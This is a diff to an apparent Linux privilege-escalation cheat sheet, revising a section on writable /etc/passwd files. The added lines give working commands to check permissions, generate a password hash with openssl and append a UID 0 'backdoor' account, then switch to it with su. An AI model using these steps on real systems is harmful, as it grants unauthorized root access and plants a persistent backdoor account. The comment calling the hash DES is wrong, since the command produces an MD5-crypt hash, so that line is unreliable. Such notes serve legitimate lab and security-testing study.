@@ -99,14 +99,24 @@ lsblk
 
 ---
 
-## Abusing Password Authentication
+## Writable `/etc/passwd`
 
-### Write to `/etc/passwd`
+Only works if `/etc/passwd` is world-writable (rare but misconfigured systems and older CTFs). Check first:
 
 ```bash
-openssl passwd w00t
-echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
-su root2
+ls -la /etc/passwd
+# -rw-rw-rw-  → writable by anyone
+```
+
+If writable, inject a new root-equivalent account:
+
+```bash
+# Generate a DES hash (still accepted by /etc/passwd second field)
+openssl passwd -1 -salt salt P@ssw0rd
+
+# Append the account — UID 0 makes it root-equivalent
+echo 'backdoor:$1$salt$vB.u3LdTp/JX5TjPzdTt00:0:0:root:/root:/bin/bash' >> /etc/passwd
+su backdoor
 ```
 
 ---
